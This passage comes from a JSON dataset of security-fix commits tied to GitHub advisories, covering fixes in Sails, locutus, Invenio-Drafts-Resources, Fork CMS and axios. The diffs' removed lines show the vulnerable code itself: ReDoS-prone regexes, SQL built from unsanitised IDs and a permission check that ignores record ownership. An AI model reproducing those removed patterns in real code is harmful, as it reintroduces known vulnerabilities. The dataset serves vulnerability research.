            "files":"{'lib\/hooks\/cors\/index.js': {'additions': 48, 'deletions': 0, 'changes': 48, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/balderdashy\/sails\/raw\/0057123a0321be6758845abbeb4290bf418ce542\/lib%2Fhooks%2Fcors%2Findex.js', 'patch': \"@@ -44,6 +44,9 @@ module.exports = function(sails) {\\n      *\/\\n     initialize: function(cb) {\\n \\n+      \/\/ Declare an array to hold info about unsafely-configured routes.\\n+      var unsafeRoutes = [];\\n+\\n       \/\/ Once it's time to bind shadow routes, get to bindin'.\\n       sails.on('router:before', function () {\\n         \/\/ (TODO: consider changing this ^^ to `sails.after()` for consistency)\\n@@ -112,10 +115,55 @@ module.exports = function(sails) {\\n               sails.log.warn('Invalid CORS settings for route '+route);\\n             }\\n \\n+            \/\/ If the global CORS defaults are not overly permissive, check this individual route's settings.\\n+            if (sails.config.cors.allRoutes === false || sails.config.cors.origin !== '*' || sails.config.cors.credentials === false) {\\n+              var routeCorsConfig = _.defaults(optionsRouteConfigs[path][verb || 'default'], sails.config.cors);\\n+              \/\/ If they are too permissive, add the route to a list of unsafe routes to warn the user about\\n+              \/\/ when running in the production environment.\\n+              if (routeCorsConfig.origin === '*' && routeCorsConfig.credentials === true) {\\n+                unsafeRoutes.push((verb ? (verb + ' ') : '') + path);\\n+              }\\n+            }\\n+\\n           }\\n \\n         });\\n \\n+        \/\/ Log a warning if your default CORS settings are super permissive in the production environment.\\n+        if (sails.config.environment === 'production') {\\n+          \/\/ If the global CORS defaults are permissive, log a warning about that.\\n+          if (\\n+            sails.config.cors.allRoutes === true &&\\n+            sails.config.cors.origin === '*' &&\\n+            sails.config.cors.credentials === true\\n+          ) {\\n+          sails.log.error('\\\\n' +\\n+                         '=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=\\\\n' +\\n+                         'WARNING: You currently have your default CORS settings configured to allow\\\\n' +\\n+                         'all requests from all origins, with credentials.  This may leave your app\\\\n' +\\n+                         'open to attack by third-party sites!  Consider making your `origins` setting\\\\n' +\\n+                         'more restrictive or setting `credentials` to false, or else make certain that\\\\n' +\\n+                         'none of your routes perform sensitive actions or reveal secure information.\\\\n' +\\n+                         '=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=\\\\n');\\n+          }\\n+          \/\/ Otherwise log a warning mentioning the particular routes that are too permissive.\\n+          else if (unsafeRoutes.length) {\\n+            sails.log.error('\\\\n' +\\n+                           '=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=\\\\n' +\\n+                           'WARNING: You currently have CORS settings on the following routes configured\\\\n' +\\n+                           'to allow all requests from all origins, with credentials:\\\\n\\\\n' + unsafeRoutes.join('\\\\n') + '\\\\n\\\\n' +\\n+                           'This may leave these routes open to attack by third-party sites!  Consider\\\\n'+\\n+                           'making the `origins` settings more restrictive or setting `credentials` to\\\\n' +\\n+                           'false, or else make certain that none of these routes perform sensitive\\\\n' +\\n+                           'actions or reveal secure information.\\\\n' +\\n+                           '=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=\\\\n'\\n+                           );\\n+          }\\n+        }\\n+\\n+\\n+\\n+\\n         _.each(optionsRouteConfigs, function(config, path) {\\n           sails.router.bind('options '+path, prepareSendHeaders(config, true), null, {_middlewareType: 'CORS HOOK: preflight'});\\n         });\"}}",
            "message_norm":"warn about overly-permissive cors settings when lifting in production",
            "language":"en",
            "entities":null,
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['lib\/hooks\/cors\/index.js'])",
            "num_files":1.0,
            "patch_content":"From 0057123a0321be6758845abbeb4290bf418ce542 Mon Sep 17 00:00:00 2001\nFrom: Scott Gress <scottmgress@gmail.com>\nDate: Wed, 5 Oct 2016 18:16:26 -0500\nSubject: [PATCH] Warn about overly-permissive CORS settings when lifting in\n production\n\n---\n lib\/hooks\/cors\/index.js | 48 +++++++++++++++++++++++++++++++++++++++++\n 1 file changed, 48 insertions(+)\n\ndiff --git a\/lib\/hooks\/cors\/index.js b\/lib\/hooks\/cors\/index.js\nindex 391ee400c1..b4345926fa 100644\n--- a\/lib\/hooks\/cors\/index.js\n+++ b\/lib\/hooks\/cors\/index.js\n@@ -44,6 +44,9 @@ module.exports = function(sails) {\n      *\/\n     initialize: function(cb) {\n \n+      \/\/ Declare an array to hold info about unsafely-configured routes.\n+      var unsafeRoutes = [];\n+\n       \/\/ Once it's time to bind shadow routes, get to bindin'.\n       sails.on('router:before', function () {\n         \/\/ (TODO: consider changing this ^^ to `sails.after()` for consistency)\n@@ -112,10 +115,55 @@ module.exports = function(sails) {\n               sails.log.warn('Invalid CORS settings for route '+route);\n             }\n \n+            \/\/ If the global CORS defaults are not overly permissive, check this individual route's settings.\n+            if (sails.config.cors.allRoutes === false || sails.config.cors.origin !== '*' || sails.config.cors.credentials === false) {\n+              var routeCorsConfig = _.defaults(optionsRouteConfigs[path][verb || 'default'], sails.config.cors);\n+              \/\/ If they are too permissive, add the route to a list of unsafe routes to warn the user about\n+              \/\/ when running in the production environment.\n+              if (routeCorsConfig.origin === '*' && routeCorsConfig.credentials === true) {\n+                unsafeRoutes.push((verb ? (verb + ' ') : '') + path);\n+              }\n+            }\n+\n           }\n \n         });\n \n+        \/\/ Log a warning if your default CORS settings are super permissive in the production environment.\n+        if (sails.config.environment === 'production') {\n+          \/\/ If the global CORS defaults are permissive, log a warning about that.\n+          if (\n+            sails.config.cors.allRoutes === true &&\n+            sails.config.cors.origin === '*' &&\n+            sails.config.cors.credentials === true\n+          ) {\n+          sails.log.error('\\n' +\n+                         '=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=\\n' +\n+                         'WARNING: You currently have your default CORS settings configured to allow\\n' +\n+                         'all requests from all origins, with credentials.  This may leave your app\\n' +\n+                         'open to attack by third-party sites!  Consider making your `origins` setting\\n' +\n+                         'more restrictive or setting `credentials` to false, or else make certain that\\n' +\n+                         'none of your routes perform sensitive actions or reveal secure information.\\n' +\n+                         '=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=\\n');\n+          }\n+          \/\/ Otherwise log a warning mentioning the particular routes that are too permissive.\n+          else if (unsafeRoutes.length) {\n+            sails.log.error('\\n' +\n+                           '=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=\\n' +\n+                           'WARNING: You currently have CORS settings on the following routes configured\\n' +\n+                           'to allow all requests from all origins, with credentials:\\n\\n' + unsafeRoutes.join('\\n') + '\\n\\n' +\n+                           'This may leave these routes open to attack by third-party sites!  Consider\\n'+\n+                           'making the `origins` settings more restrictive or setting `credentials` to\\n' +\n+                           'false, or else make certain that none of these routes perform sensitive\\n' +\n+                           'actions or reveal secure information.\\n' +\n+                           '=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=\\n'\n+                           );\n+          }\n+        }\n+\n+\n+\n+\n         _.each(optionsRouteConfigs, function(config, path) {\n           sails.router.bind('options '+path, prepareSendHeaders(config, true), null, {_middlewareType: 'CORS HOOK: preflight'});\n         });",
            "code_diff":"@@ -44,6 +44,9 @@ module.exports = function(sails) {\n      *\/\n     initialize: function(cb) {\n \n+      \/\/ Declare an array to hold info about unsafely-configured routes.\n+      var unsafeRoutes = [];\n+\n       \/\/ Once it's time to bind shadow routes, get to bindin'.\n       sails.on('router:before', function () {\n         \/\/ (TODO: consider changing this ^^ to `sails.after()` for consistency)\n@@ -112,10 +115,55 @@ module.exports = function(sails) {\n               sails.log.warn('Invalid CORS settings for route '+route);\n             }\n \n+            \/\/ If the global CORS defaults are not overly permissive, check this individual route's settings.\n+            if (sails.config.cors.allRoutes === false || sails.config.cors.origin !== '*' || sails.config.cors.credentials === false) {\n+              var routeCorsConfig = _.defaults(optionsRouteConfigs[path][verb || 'default'], sails.config.cors);\n+              \/\/ If they are too permissive, add the route to a list of unsafe routes to warn the user about\n+              \/\/ when running in the production environment.\n+              if (routeCorsConfig.origin === '*' && routeCorsConfig.credentials === true) {\n+                unsafeRoutes.push((verb ? (verb + ' ') : '') + path);\n+              }\n+            }\n+\n           }\n \n         });\n \n+        \/\/ Log a warning if your default CORS settings are super permissive in the production environment.\n+        if (sails.config.environment === 'production') {\n+          \/\/ If the global CORS defaults are permissive, log a warning about that.\n+          if (\n+            sails.config.cors.allRoutes === true &&\n+            sails.config.cors.origin === '*' &&\n+            sails.config.cors.credentials === true\n+          ) {\n+          sails.log.error('\\n' +\n+                         '=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=\\n' +\n+                         'WARNING: You currently have your default CORS settings configured to allow\\n' +\n+                         'all requests from all origins, with credentials.  This may leave your app\\n' +\n+                         'open to attack by third-party sites!  Consider making your `origins` setting\\n' +\n+                         'more restrictive or setting `credentials` to false, or else make certain that\\n' +\n+                         'none of your routes perform sensitive actions or reveal secure information.\\n' +\n+                         '=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=\\n');\n+          }\n+          \/\/ Otherwise log a warning mentioning the particular routes that are too permissive.\n+          else if (unsafeRoutes.length) {\n+            sails.log.error('\\n' +\n+                           '=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=\\n' +\n+                           'WARNING: You currently have CORS settings on the following routes configured\\n' +\n+                           'to allow all requests from all origins, with credentials:\\n\\n' + unsafeRoutes.join('\\n') + '\\n\\n' +\n+                           'This may leave these routes open to attack by third-party sites!  Consider\\n'+\n+                           'making the `origins` settings more restrictive or setting `credentials` to\\n' +\n+                           'false, or else make certain that none of these routes perform sensitive\\n' +\n+                           'actions or reveal secure information.\\n' +\n+                           '=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=\\n'\n+                           );\n+          }\n+        }\n+\n+\n+\n+\n         _.each(optionsRouteConfigs, function(config, path) {\n           sails.router.bind('options '+path, prepareSendHeaders(config, true), null, {_middlewareType: 'CORS HOOK: preflight'});\n         });"
        },
        {
            "index":245,
            "vuln_id":"GHSA-39q4-p535-c852",
            "cwe_id":"{'CWE-400'}",
            "score":7.5,
            "chain":"{'https:\/\/github.com\/locutusjs\/locutus\/commit\/eb863321990e7e5514aa14f68b8d9978ece9e65e'}",
            "dataset":"osv",
            "summary":"Uncontrolled Resource Consumption in locutus The package locutus before 2.0.15 are vulnerable to Regular Expression Denial of Service (ReDoS) via the gopher_parsedir function.",
            "published_date":"2021-06-10",
            "chain_len":1,
            "project":"https:\/\/github.com\/locutusjs\/locutus",
            "commit_href":"https:\/\/github.com\/locutusjs\/locutus\/commit\/eb863321990e7e5514aa14f68b8d9978ece9e65e",
            "commit_sha":"eb863321990e7e5514aa14f68b8d9978ece9e65e",
            "patch":"SINGLE",
            "chain_ord":"['eb863321990e7e5514aa14f68b8d9978ece9e65e']",
            "before_first_fix_commit":"{'243b723896c3c82f5496b6008f9aa1be52741899'}",
            "last_fix_commit":"eb863321990e7e5514aa14f68b8d9978ece9e65e",
            "chain_ord_pos":1.0,
            "commit_datetime":"05\/27\/2021, 06:46:30",
            "message":"Prevent ReDos issue with regex inside gopher_parsedir (#446)",
            "author":"Rafa\u0142 Kukawski",
            "comments":null,
            "stats":"{'additions': 1, 'deletions': 1, 'total': 2}",
            "files":"{'src\/php\/net-gopher\/gopher_parsedir.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/locutusjs\/locutus\/raw\/eb863321990e7e5514aa14f68b8d9978ece9e65e\/src%2Fphp%2Fnet-gopher%2Fgopher_parsedir.js', 'patch': '@@ -22,7 +22,7 @@ module.exports = function gopher_parsedir (dirent) { \/\/ eslint-disable-line came\\n    * s = Audio file format, primarily a WAV file\\n    *\/\\n \\n-  const entryPattern = \/^(.)(.*?)\\\\t(.*?)\\\\t(.*?)\\\\t(.*?)\\\\u000d\\\\u000a$\/\\n+  const entryPattern = \/^(.)([^\\\\t]*)\\\\t([^\\\\t]*)\\\\t([^\\\\t]*)\\\\t([^\\\\t]*)\\\\r\\\\n$\/\\n   const entry = dirent.match(entryPattern)\\n \\n   if (entry === null) {'}}",
            "message_norm":"prevent redos issue with regex inside gopher_parsedir (#446)",
            "language":"en",
            "entities":"[('prevent', 'ACTION', ''), ('redos', 'SECWORD', ''), ('issue', 'FLAW', ''), ('#446', 'ISSUE', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['src\/php\/net-gopher\/gopher_parsedir.js'])",
            "num_files":1.0,
            "patch_content":"From eb863321990e7e5514aa14f68b8d9978ece9e65e Mon Sep 17 00:00:00 2001\nFrom: =?UTF-8?q?Rafa=C5=82=20Kukawski?= <rafal@kukawski.pl>\nDate: Thu, 27 May 2021 08:46:30 +0200\nSubject: [PATCH] Prevent ReDos issue with regex inside gopher_parsedir (#446)\n\n---\n src\/php\/net-gopher\/gopher_parsedir.js | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\ndiff --git a\/src\/php\/net-gopher\/gopher_parsedir.js b\/src\/php\/net-gopher\/gopher_parsedir.js\nindex ac9a32c3d0..48cf9a5437 100644\n--- a\/src\/php\/net-gopher\/gopher_parsedir.js\n+++ b\/src\/php\/net-gopher\/gopher_parsedir.js\n@@ -22,7 +22,7 @@ module.exports = function gopher_parsedir (dirent) { \/\/ eslint-disable-line came\n    * s = Audio file format, primarily a WAV file\n    *\/\n \n-  const entryPattern = \/^(.)(.*?)\\t(.*?)\\t(.*?)\\t(.*?)\\u000d\\u000a$\/\n+  const entryPattern = \/^(.)([^\\t]*)\\t([^\\t]*)\\t([^\\t]*)\\t([^\\t]*)\\r\\n$\/\n   const entry = dirent.match(entryPattern)\n \n   if (entry === null) {",
            "code_diff":"@@ -22,7 +22,7 @@ module.exports = function gopher_parsedir (dirent) { \/\/ eslint-disable-line came\n    * s = Audio file format, primarily a WAV file\n    *\/\n \n-  const entryPattern = \/^(.)(.*?)\\t(.*?)\\t(.*?)\\t(.*?)\\u000d\\u000a$\/\n+  const entryPattern = \/^(.)([^\\t]*)\\t([^\\t]*)\\t([^\\t]*)\\t([^\\t]*)\\r\\n$\/\n   const entry = dirent.match(entryPattern)\n \n   if (entry === null) {"
        },
        {
            "index":952,
            "vuln_id":"GHSA-xr38-w74q-r8jv",
            "cwe_id":"{'CWE-862', 'CWE-863'}",
            "score":6.4,
            "chain":"{'https:\/\/github.com\/inveniosoftware\/invenio-drafts-resources\/commit\/039b0cff1ad4b952000f4d8c3a93f347108b6626'}",
            "dataset":"osv",
            "summary":"Permissions not properly checked in Invenio-Drafts-Resources ### Impact\n\nInvenio-Drafts-Resources does not properly check permissions when a record is published. The vulnerability is exploitable in a default installation of InvenioRDM. An authenticated user is able via REST API calls to publish draft records of other users if they know the record identifier and the draft validates (e.g. all require fields filled out). An attacker is not able to modify the data in the record, and thus e.g. *cannot* change a record from restricted to public.\n\n### Details\n\nThe service's ``publish()`` method contains the following permission check:\n\n```python\ndef publish(..):\n    self.require_permission(identity, \"publish\")\n```\nHowever, the record should have been passed into the permission check so that the need generators have access to e.g. the record owner.\n\n```python\ndef publish(..):\n    self.require_permission(identity, \"publish\", record=record)\n```\nThe bug is activated in Invenio-RDM-Records which has a need generator called ``RecordOwners()``, which when no record is passed in defaults to allow any authenticated user:\n\n```python\nclass RecordOwners(Generator):\n    def needs(self, record=None, **kwargs):\n        if record is None:\n            return [authenticated_user]\n    # ...\n```\n\n### Patches\n\nThe problem is patched in Invenio-Drafts-Resources v0.13.7 and 0.14.6+, which is part of InvenioRDM v6.0.1 and InvenioRDM v7.0 respectively.\n\nYou can verify the version installed of Invenio-Drafts-Resources via PIP:\n\n```console\ncd ~\/src\/my-site\npipenv run pip freeze | grep invenio-drafts-resources\n```\n\n### References\n\n- [Security policy](https:\/\/invenio.readthedocs.io\/en\/latest\/community\/security-policy.html)\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Chat with us on Discord: https:\/\/discord.gg\/8qatqBC",
            "published_date":"2021-12-06",
            "chain_len":1,
            "project":"https:\/\/github.com\/inveniosoftware\/invenio-drafts-resources",
            "commit_href":"https:\/\/github.com\/inveniosoftware\/invenio-drafts-resources\/commit\/039b0cff1ad4b952000f4d8c3a93f347108b6626",
            "commit_sha":"039b0cff1ad4b952000f4d8c3a93f347108b6626",
            "patch":"SINGLE",
            "chain_ord":"['039b0cff1ad4b952000f4d8c3a93f347108b6626']",
            "before_first_fix_commit":"{'998ede99c377c84f11fe22c07c20f90c88c463dc'}",
            "last_fix_commit":"039b0cff1ad4b952000f4d8c3a93f347108b6626",
            "chain_ord_pos":1.0,
            "commit_datetime":"11\/24\/2021, 14:32:41",
            "message":"security: fix missing permission check of publish\n\n* Invenio-Drafts-Resources does not properly check permissions when a\n  record is published. The vulnerability is exploitable in a default\n  installation of InvenioRDM. An authenticated a user is able via REST\n  API calls to publish draft records of other users if they know the\n  record identifier and the draft validates (e.g. all require fields\n  filled out). An attacker is not able to modify the data in the record,\n  and thus e.g. cannot change a record from restricted to public.",
            "author":"Lars Holm Nielsen",
            "comments":null,
            "stats":"{'additions': 1, 'deletions': 2, 'total': 3}",
            "files":"{'invenio_drafts_resources\/services\/records\/service.py': {'additions': 1, 'deletions': 2, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/inveniosoftware\/invenio-drafts-resources\/raw\/039b0cff1ad4b952000f4d8c3a93f347108b6626\/invenio_drafts_resources%2Fservices%2Frecords%2Fservice.py', 'patch': '@@ -267,10 +267,9 @@ def publish(self, id_, identity, uow=None):\\n               into records)\\n             - Create or update associated (published) record with data\\n         \"\"\"\\n-        self.require_permission(identity, \"publish\")\\n-\\n         # Get the draft\\n         draft = self.draft_cls.pid.resolve(id_, registered_only=False)\\n+        self.require_permission(identity, \"publish\", record=draft)\\n \\n         # Validate the draft strictly - since a draft can be saved with errors\\n         # we do a strict validation here to make sure only valid drafts can be'}}",
            "message_norm":"security: fix missing permission check of publish\n\n* invenio-drafts-resources does not properly check permissions when a\n  record is published. the vulnerability is exploitable in a default\n  installation of inveniordm. an authenticated a user is able via rest\n  api calls to publish draft records of other users if they know the\n  record identifier and the draft validates (e.g. all require fields\n  filled out). an attacker is not able to modify the data in the record,\n  and thus e.g. cannot change a record from restricted to public.",
            "language":"en",
            "entities":"[('security', 'SECWORD', ''), ('fix', 'ACTION', ''), ('permission', 'SECWORD', ''), ('permissions', 'SECWORD', ''), ('vulnerability', 'SECWORD', ''), ('exploitable', 'SECWORD', ''), ('validates', 'ACTION', ''), ('attacker', 'FLAW', ''), ('change', 'ACTION', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['invenio_drafts_resources\/services\/records\/service.py'])",
            "num_files":1.0,
            "patch_content":"From 039b0cff1ad4b952000f4d8c3a93f347108b6626 Mon Sep 17 00:00:00 2001\nFrom: Lars Holm Nielsen <lars.holm.nielsen@cern.ch>\nDate: Wed, 24 Nov 2021 15:32:41 +0100\nSubject: [PATCH] security: fix missing permission check of publish\n\n* Invenio-Drafts-Resources does not properly check permissions when a\n  record is published. The vulnerability is exploitable in a default\n  installation of InvenioRDM. An authenticated a user is able via REST\n  API calls to publish draft records of other users if they know the\n  record identifier and the draft validates (e.g. all require fields\n  filled out). An attacker is not able to modify the data in the record,\n  and thus e.g. cannot change a record from restricted to public.\n---\n invenio_drafts_resources\/services\/records\/service.py | 3 +--\n 1 file changed, 1 insertion(+), 2 deletions(-)\n\ndiff --git a\/invenio_drafts_resources\/services\/records\/service.py b\/invenio_drafts_resources\/services\/records\/service.py\nindex 20e367dc..c9ee5dfa 100644\n--- a\/invenio_drafts_resources\/services\/records\/service.py\n+++ b\/invenio_drafts_resources\/services\/records\/service.py\n@@ -267,10 +267,9 @@ def publish(self, id_, identity, uow=None):\n               into records)\n             - Create or update associated (published) record with data\n         \"\"\"\n-        self.require_permission(identity, \"publish\")\n-\n         # Get the draft\n         draft = self.draft_cls.pid.resolve(id_, registered_only=False)\n+        self.require_permission(identity, \"publish\", record=draft)\n \n         # Validate the draft strictly - since a draft can be saved with errors\n         # we do a strict validation here to make sure only valid drafts can be",
            "code_diff":"@@ -267,10 +267,9 @@ def publish(self, id_, identity, uow=None):\n               into records)\n             - Create or update associated (published) record with data\n         \"\"\"\n-        self.require_permission(identity, \"publish\")\n-\n         # Get the draft\n         draft = self.draft_cls.pid.resolve(id_, registered_only=False)\n+        self.require_permission(identity, \"publish\", record=draft)\n \n         # Validate the draft strictly - since a draft can be saved with errors\n         # we do a strict validation here to make sure only valid drafts can be"
        },
        {
            "index":163,
            "vuln_id":"GHSA-q863-cchm-c6c6",
            "cwe_id":"{'CWE-89'}",
            "score":7.5,
            "chain":"{'https:\/\/github.com\/forkcms\/forkcms\/commit\/7a12046a67ae5d8cf04face3ee75e55f03a1a608'}",
            "dataset":"osv",
            "summary":"SQL Injection in Fork CMS Fork CMS contains a SQL injection vulnerability in versions prior to version 5.11.1. When deleting submissions which belong to a formular (made with module `FormBuilder`), the parameter `id[]` is vulnerable to SQL injection.",
            "published_date":"2022-03-25",
            "chain_len":1,
            "project":"https:\/\/github.com\/forkcms\/forkcms",
            "commit_href":"https:\/\/github.com\/forkcms\/forkcms\/commit\/7a12046a67ae5d8cf04face3ee75e55f03a1a608",
            "commit_sha":"7a12046a67ae5d8cf04face3ee75e55f03a1a608",
            "patch":"SINGLE",
            "chain_ord":"['7a12046a67ae5d8cf04face3ee75e55f03a1a608']",
            "before_first_fix_commit":"{'1b38e33a98992793e998a937b717355212346993'}",
            "last_fix_commit":"7a12046a67ae5d8cf04face3ee75e55f03a1a608",
            "chain_ord_pos":1.0,
            "commit_datetime":"03\/23\/2022, 12:16:53",
            "message":"Prevent sql injection through the ids of the action",
            "author":"Jelmer Prins",
            "comments":null,
            "stats":"{'additions': 1, 'deletions': 0, 'total': 1}",
            "files":"{'src\/Backend\/Modules\/FormBuilder\/Engine\/Model.php': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/forkcms\/forkcms\/raw\/7a12046a67ae5d8cf04face3ee75e55f03a1a608\/src%2FBackend%2FModules%2FFormBuilder%2FEngine%2FModel.php', 'patch': \"@@ -152,6 +152,7 @@ public static function delete(int $id): void\\n     public static function deleteData(array $ids): void\\n     {\\n         $database = BackendModel::getContainer()->get('database');\\n+        $ids = array_map('intval', $ids);\\n \\n         $database->delete('forms_data', 'id IN(' . implode(',', $ids) . ')');\\n         $database->delete('forms_data_fields', 'data_id IN(' . implode(',', $ids) . ')');\"}}",
            "message_norm":"prevent sql injection through the ids of the action",
            "language":"en",
            "entities":"[('prevent', 'ACTION', ''), ('sql injection', 'SECWORD', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['src\/Backend\/Modules\/FormBuilder\/Engine\/Model.php'])",
            "num_files":1.0,
            "patch_content":"From 7a12046a67ae5d8cf04face3ee75e55f03a1a608 Mon Sep 17 00:00:00 2001\nFrom: Jelmer Prins <jelmer@pageon.be>\nDate: Wed, 23 Mar 2022 13:16:53 +0100\nSubject: [PATCH] Prevent sql injection through the ids of the action\n\n---\n src\/Backend\/Modules\/FormBuilder\/Engine\/Model.php | 1 +\n 1 file changed, 1 insertion(+)\n\ndiff --git a\/src\/Backend\/Modules\/FormBuilder\/Engine\/Model.php b\/src\/Backend\/Modules\/FormBuilder\/Engine\/Model.php\nindex 6a13543526..6028b7607f 100644\n--- a\/src\/Backend\/Modules\/FormBuilder\/Engine\/Model.php\n+++ b\/src\/Backend\/Modules\/FormBuilder\/Engine\/Model.php\n@@ -152,6 +152,7 @@ public static function delete(int $id): void\n     public static function deleteData(array $ids): void\n     {\n         $database = BackendModel::getContainer()->get('database');\n+        $ids = array_map('intval', $ids);\n \n         $database->delete('forms_data', 'id IN(' . implode(',', $ids) . ')');\n         $database->delete('forms_data_fields', 'data_id IN(' . implode(',', $ids) . ')');",
            "code_diff":"@@ -152,6 +152,7 @@ public static function delete(int $id): void\n     public static function deleteData(array $ids): void\n     {\n         $database = BackendModel::getContainer()->get('database');\n+        $ids = array_map('intval', $ids);\n \n         $database->delete('forms_data', 'id IN(' . implode(',', $ids) . ')');\n         $database->delete('forms_data_fields', 'data_id IN(' . implode(',', $ids) . ')');"
        },
        {
            "index":358,
            "vuln_id":"GHSA-cph5-m8f7-6c5x",
            "cwe_id":"{'CWE-697', 'CWE-400'}",
            "score":7.5,
            "chain":"{'https:\/\/github.com\/axios\/axios\/commit\/5b457116e31db0e88fede6c428e969e87f290929'}",
            "dataset":"osv",
            "summary":"Incorrect Comparison in axios axios is vulnerable to Inefficient Regular Expression Complexity",
            "published_date":"2021-09-01",
            "chain_len":1,
            "project":"https:\/\/github.com\/axios\/axios",
            "commit_href":"https:\/\/github.com\/axios\/axios\/commit\/5b457116e31db0e88fede6c428e969e87f290929",
            "commit_sha":"5b457116e31db0e88fede6c428e969e87f290929",
            "patch":"SINGLE",
            "chain_ord":"['5b457116e31db0e88fede6c428e969e87f290929']",
            "before_first_fix_commit":"{'5bc9ea24dda14e74def0b8ae9cdb3fa1a0c77773'}",
            "last_fix_commit":"5b457116e31db0e88fede6c428e969e87f290929",
            "chain_ord_pos":1.0,
            "commit_datetime":"08\/30\/2021, 12:33:43",
            "message":"Security fix for ReDoS (#3980)",
            "author":"ready-research",
            "comments":"{'com_1': {'author': 'kanatBektursyn', 'datetime': '09\/02\/2021, 07:27:22', 'body': 'What is the usage of self made trim function?'}, 'com_2': {'author': 'muditjuneja', 'datetime': '09\/03\/2021, 13:40:44', 'body': 'Something related to this : https:\/\/app.snyk.io\/vuln\/SNYK-JS-AXIOS-1579269?'}, 'com_3': {'author': 'vargaurav', 'datetime': '09\/05\/2021, 05:56:14', 'body': 'This is getting flagged in snyk.'}, 'com_4': {'author': 'tbogard', 'datetime': '09\/06\/2021, 01:01:48', 'body': '> What is the usage of self made trim function?\\r\\n\\r\\nProbably an intended custom made trim function with the intention to be faster... but ended in bloating resources...'}, 'com_5': {'author': 'catscarlet', 'datetime': '09\/08\/2021, 03:25:02', 'body': 'But, but `str.trim()` should not only deal with \\\\s but also deal with \\\\uFEFF and \\\\xA0. \\r\\n\\r\\nThe trim Polyfill was:\\r\\n\\r\\n```\\r\\nif (!String.prototype.trim) {\\r\\n  String.prototype.trim = function () {\\r\\n    return this.replace(\/^[\\\\s\\\\uFEFF\\\\xA0]+|[\\\\s\\\\uFEFF\\\\xA0]+$\/g, \\'\\');\\r\\n  };\\r\\n}\\r\\n```\\r\\n\\r\\nMDN(en) removed this part because of \"outdated with WebView Android 37\".\\r\\nThe other languages still have this Polyfill part.\\r\\n\\r\\nSee mdn\/content#7602'}, 'com_6': {'author': 'Teej42', 'datetime': '09\/09\/2021, 17:15:48', 'body': 'It is not clear to me, but was this fix added in v0.21.4 release, or will be added in the next release?'}, 'com_7': {'author': 'jasonsaayman', 'datetime': '09\/09\/2021, 17:57:06', 'body': \"Already added :) I think the custom trim function was used like this incase a browser or version of node did not have native support. I don't think we can drop it just yet due to supporting a pretty large range of browsers. However I will review some of that code when I have a chance and see if it would be possible to get rid of it.\"}}",
            "stats":"{'additions': 1, 'deletions': 1, 'total': 2}",
            "files":"{'lib\/utils.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/axios\/axios\/raw\/5b457116e31db0e88fede6c428e969e87f290929\/lib%2Futils.js', 'patch': \"@@ -185,7 +185,7 @@ function isURLSearchParams(val) {\\n  * @returns {String} The String freed of excess whitespace\\n  *\/\\n function trim(str) {\\n-  return str.replace(\/^\\\\s*\/, '').replace(\/\\\\s*$\/, '');\\n+  return str.trim ? str.trim() : str.replace(\/^\\\\s+|\\\\s+$\/g, '');\\n }\\n \\n \/**\"}}",
            "message_norm":"security fix for redos (#3980)",
            "language":"en",
            "entities":"[('security', 'SECWORD', ''), ('redos', 'SECWORD', ''), ('#3980', 'ISSUE', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['lib\/utils.js'])",
            "num_files":1.0,
